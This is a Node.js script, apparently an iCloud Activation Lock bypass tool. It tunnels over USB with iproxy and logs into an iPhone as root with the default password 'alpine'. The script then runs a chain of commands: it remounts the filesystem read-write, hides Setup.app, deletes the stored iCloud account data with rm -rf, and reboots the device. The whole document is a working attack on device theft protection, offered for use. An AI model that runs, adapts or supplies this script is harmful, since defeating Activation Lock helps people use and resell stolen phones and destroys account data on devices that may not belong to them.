const { exec } = require('child_process');
const { Client } = require('ssh2');

const RPORT = 44;
const LPORT = 2222;
const password = 'alpine';

let iproxyProcess;

function runCommand(conn, description, command) {
    return new Promise((resolve, reject) => {
        console.log(description);
        conn.exec(command, (err, stream) => {
            if (err) return reject(err);
            stream.on('close', resolve).stderr.on('data', (data) => {
                console.error('STDERR:', data.toString());
            });
        });
    });
}

async function bypassiCloud() {
    iproxyProcess = exec(`iproxy ${LPORT} ${RPORT}`, { stdio: 'ignore' });
    
    const conn = new Client();
    console.log("Initiating SSH connection...");
    
    await new Promise((resolve) => {
        conn.on('ready', resolve).on('error', (err) => {
            console.log("Failed, retrying...");
            setTimeout(() => conn.connect({
                host: 'localhost',
                port: LPORT,
                username: 'root',
                password: password
            }), 2000);
        }).connect({
            host: 'localhost',
            port: LPORT,
            username: 'root',
            password: password
        });
    });
    
    console.log("Connection established");
    
    const commands = [
        ["Mounting filesystem as read/write", "mount -o rw,union,update /"],
        ["Cleaning mount_rw file", 'echo "" > /.mount_rw'],
        ["Hiding Setup.app", "mv /Application/Setup.app /Application/Setup.app.backup"],
        ["Clearing UI cache", "uicache --all"],
        ["Clearing iCloud user", "rm -rf /var/mobile/Library/Accounts/*"],
        ["Respringing device", "killall backboardd"],
        ["Rebooting device", "reboot"]
    ];
    
    for (const [desc, cmd] of commands) {
        await runCommand(conn, desc, cmd);
    }
    
    conn.end();
    iproxyProcess.kill();
}

bypassiCloud().catch(console.error);
